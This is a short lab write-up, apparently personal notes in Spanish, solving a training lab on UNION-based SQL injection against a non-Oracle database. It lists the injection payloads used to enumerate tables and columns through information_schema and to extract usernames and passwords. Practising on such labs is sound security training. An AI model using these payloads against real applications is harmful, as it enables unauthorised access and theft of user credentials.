Lab: SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.
la img 1 define el numero de columnas
con la img 2 vemos el motro de database

img3 con este payload ' UNION SELECT NULL, table_name FROM information_schema.tables vemos las tablas sospecho de pg_user


img4 payload
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='pg_user' -- - y vemos las columnas

img5 solucion  con payload ' UNION SELECT passwd, usename FROM pg_user -- - COMO PODEMOS VER NO ERA ESA tabla

En la lista de tablas del payload img3 vemos esta lista users_mvzzsm
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users_mvzzsm' -- - img6 SE VE EL RESULTADO DEL payload

IMG7 SOLUCION FINAL
' UNION SELECT password_pwjajw, username_onrqcx FROM users_mvzzsm -- -